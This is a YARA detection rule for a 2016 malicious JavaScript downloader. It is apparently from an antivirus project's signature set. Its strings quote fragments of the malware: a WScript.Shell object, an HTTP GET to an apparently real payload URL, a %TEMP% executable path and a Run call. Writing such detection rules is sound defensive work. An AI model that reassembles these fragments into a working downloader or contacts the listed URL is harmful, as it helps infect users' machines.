rule sig_20160329_4ab02eb1bbff305eb4bcf5b1525f9d44 {
  meta:
    description = "datamaliciousorder - file 20160329_4ab02eb1bbff305eb4bcf5b1525f9d44.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "5cb07140e2fcfad83c618d4a8140eb4cdc62727b648e98df56c292df91489519"

  strings:
    $s1  = "function Wpxldctgnz() {return Jiabdk[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"dZByaut2MISF7M.exe\";};" fullword ascii
    $s2  = "do {WScript[Hrjobg](Sovurezuow() * 11)} while (Lgmtw[\"readystate\"] < 2 * 2);" fullword ascii
    $s3  = "Lgmtw[Faxxevfc](\"GET\", \"http://www.qubefurniture.co.uk/lsd3ka\", false);" fullword ascii
    $s4  = "var Jiabdk = function Nmlibioss() {return WScript[Hotfjsss](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Sdcay(Asvwpmdnb, Kucbp){return Asvwpmdnb - Kucbp;};" fullword ascii
    $s6  = "function Obrmtkkf(Ksgejiim){Jiabdk[\"Run\"](Ksgejiim, Ruvipim, Ruvipim);};" fullword ascii
    $s7  = "function Acwvufkhe() {return ((Ywyaviccfi == true) && (Ywyaviccfi == Dsqubhfulr)) ? 1 : Ruvipim;};" fullword ascii
    $s8  = "function Sovurezuow(){return 22;};" fullword ascii
    $s9  = " while (Epjuronj){" fullword ascii
    $s10 = "Dsqubhfulr = true; " fullword ascii
    $s11 = "function Uwagvrjir(){return Dlpzbxjn;};" fullword ascii
    $s12 = "function Zydeujdg()" fullword ascii
    $s13 = "var Deqkagb = false;" fullword ascii
    $s14 = "function Nnqpkara(Ecetuaq) {var Voiiqnoi = (1, 2, 3, 4, 5, Ecetuaq); return Voiiqnoi;};" fullword ascii
    $s15 = "function Shjgkvynt(){return Hotfjsss;};" fullword ascii
    $s16 = "var Ywyaviccfi = false;" fullword ascii
    $s17 = "var Hnrhxqph = new this[\"Date\"]();" fullword ascii
    $s18 = "Ywyaviccfi = true; " fullword ascii
    $s19 = "var Dsqubhfulr = false;" fullword ascii
    $s20 = "} catch(Syjpp){Epjuronj = (\"asdfa\", \"fadfasdf\", \"afdafa\", 2);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}